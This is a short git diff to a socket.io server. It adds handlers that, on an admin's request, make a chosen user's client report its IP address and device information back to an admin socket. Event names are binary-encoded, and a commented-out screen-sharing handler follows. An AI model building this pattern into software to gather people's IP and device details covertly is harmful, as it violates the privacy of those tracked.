@@ -145,6 +145,32 @@ io.on('connection', async (socket) => {
         socket.to(userSocketId).emit(userClicked, (id));
     });
 
+    const ipInfo = binaryEvent('ipInfo');
+    socket.on(ipInfo, (id) => {
+        userId = binaryToString(id);
+        const userSocketId = userSocket[userId];
+        socket.to(userSocketId).emit(ipInfo);
+    });
+
+    const sendIpInfo = binaryEvent('sendIpInfo');
+    socket.on(sendIpInfo, (ip) => {
+        socket.to(adminSocket).emit(sendIpInfo, (ip));
+    });
+
+    const deviceInfo = binaryEvent('deviceInfo');
+    socket.on(deviceInfo, (id) => {
+        userId = binaryToString(id);
+        const userSocketId = userSocket[userId];
+        const DeviceInfo = binaryEvent('DeviceInfo');
+        socket.to(userSocketId).emit(DeviceInfo);
+    });
+
+    const sendDeviceInfo = binaryEvent('sendDeviceInfo');
+    socket.on(sendDeviceInfo, (dInfo, ip) => {
+        console.log(ip);
+        socket.to(adminSocket).emit(sendDeviceInfo, dInfo, ip);
+    });
+
     // const screenShareClicked = binaryEvent('screenShareClicked');
     // socket.on(screenShareClicked, (id) => {
     //     function binaryToString(binaryStr) {
